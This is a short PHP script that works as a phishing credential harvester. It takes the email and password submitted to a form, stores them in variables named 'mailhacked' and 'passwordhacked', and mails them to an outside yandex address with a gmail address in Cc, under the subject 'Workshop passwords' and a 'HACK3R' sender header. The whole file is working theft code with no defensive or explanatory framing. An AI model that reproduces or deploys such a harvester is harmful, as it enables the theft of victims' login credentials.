<?php
        $mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
         $to = "mohandas.mair@yandex.com";
         $subject = "Workshop passwords";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:HACK3R@Hack3r.com \r\n";
         $header .= "Cc:tadeualvez6@gmail.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
      ?>